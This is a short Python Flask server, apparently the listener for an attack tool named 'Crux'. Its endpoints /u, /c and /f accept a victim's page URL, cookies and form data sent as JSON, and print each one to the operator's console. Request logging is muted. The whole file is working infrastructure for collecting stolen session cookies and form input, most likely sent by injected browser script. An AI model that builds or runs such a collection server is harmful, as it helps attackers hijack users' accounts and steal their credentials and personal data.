from flask import Flask, request
import json
import logging
from rich import print as rprint

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


logging.basicConfig(level=logging.INFO)

app = Flask(__name__)

@app.route("/")
def hello_world():
    return "<p>Hello from Crux!</p>"

@app.route("/u", methods=["POST"])
def get_url():
    if request.json:
        url = request.json["url"]
        rprint(f"[blue][+] URL: {url}[/blue]")
    return "Thanks!"

@app.route("/c", methods=["POST"])
def get_cookie():
    if request.json:
        cookie = request.json["cookie"]
        rprint(f"[yellow][+] Cookie: {cookie}[/yellow]")
    return "Thanks!"

@app.route("/f", methods=["POST"])
def get_form_data():
    if request.json:
        data = request.json["data"]
        rprint(f"[red][+] Form Data: {data}[/red]")
    return "Thanks!"